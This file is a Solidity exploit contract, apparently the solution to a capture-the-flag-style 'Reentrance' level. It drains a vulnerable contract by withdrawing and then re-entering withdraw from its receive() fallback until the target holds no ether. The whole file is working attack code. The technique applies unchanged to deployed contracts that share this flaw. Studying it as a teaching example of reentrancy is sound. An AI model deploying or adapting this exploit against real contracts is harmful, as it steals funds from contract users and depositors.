// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Reentrance.sol";

contract ReentranceAttack {
    Reentrance target;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    // EOA must deposit some ether into the target contract before launching the attack
    function attack() external {
        target.withdraw(target.balanceOf(address(this)));
    }

    receive() external payable {
        require(
            msg.sender == address(target),
            "ReentranceAttack.receive: Target only"
        );

        uint256 targetBal = address(target).balance;
        uint256 attackerBal = target.balanceOf(address(this));

        if (targetBal == 0) return;
        if (attackerBal < targetBal) {
            target.withdraw(attackerBal);
        } else {
            target.withdraw(targetBal);
        }
    }
}
